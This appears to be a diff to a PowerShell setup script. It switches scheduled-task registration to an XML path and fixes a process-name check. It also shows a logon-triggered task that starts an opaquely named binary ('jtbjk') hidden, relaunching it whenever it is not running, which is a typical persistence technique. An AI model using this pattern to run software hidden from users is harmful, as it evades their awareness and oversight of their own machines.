@@ -230,8 +230,15 @@ function Register-ManagedTask {
         }
     }
 
+    # Register through XML: the object-based CIM path can fail with E_INVALIDARG on some Windows builds.
+    $taskDefinition = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -ErrorAction Stop
+    $taskXml = Export-ScheduledTask -InputObject $taskDefinition -ErrorAction Stop
+    if (-not $taskXml) {
+        throw "Task '$TaskName' could not be serialized to Task Scheduler XML."
+    }
+
     # Replace the complete definition in place; a failed update must not delete the old task.
-    Register-ScheduledTask -TaskPath '\' -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force -ErrorAction Stop | Out-Null
+    Register-ScheduledTask -TaskPath '\' -TaskName $TaskName -Xml $taskXml -Force -ErrorAction Stop | Out-Null
 }
 
 function Find-ToolPath {
@@ -809,7 +816,7 @@ try {
 
         if ($jtbjkBin) {
             $jtbjkLaunchCommand = New-HiddenStartProcessCommand -FilePath $jtbjkBin
-            $jtbjkTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $jtbjkLaunchCommand }"
+            $jtbjkTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*jtbjk*' } | Select-Object -First 1)) { $jtbjkLaunchCommand }"
             $jtbjkAction = New-PowerShellTaskAction -Command $jtbjkTaskCommand
 
             $jtbjkTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
